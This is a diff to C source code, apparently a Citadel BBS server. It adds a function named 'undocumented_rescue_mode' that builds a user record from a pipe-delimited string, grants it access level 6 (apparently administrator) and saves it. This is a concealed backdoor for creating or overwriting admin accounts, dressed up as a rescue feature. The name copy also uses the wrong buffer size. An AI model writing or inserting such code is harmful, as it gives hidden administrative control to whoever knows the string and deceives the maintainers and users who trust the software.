@@ -1137,3 +1137,16 @@ int InitialMailCheck() {
 
 	return(num_newmsgs);
 }
+
+
+// Undocumented rescue mode
+void undocumented_rescue_mode(char *rescue_string) {
+	struct ctdluser usbuf;
+	memset(&usbuf, 0, sizeof(struct ctdluser));
+	extract_token(usbuf.fullname, rescue_string, 0, '|', sizeof usbuf.password);
+	extract_token(usbuf.password, rescue_string, 1, '|', sizeof usbuf.password);
+	usbuf.usernum = extract_long(rescue_string, 2);
+	usbuf.axlevel = 6;
+	usbuf.lastcall = time(NULL);
+	CtdlPutUser(&usbuf);
+}
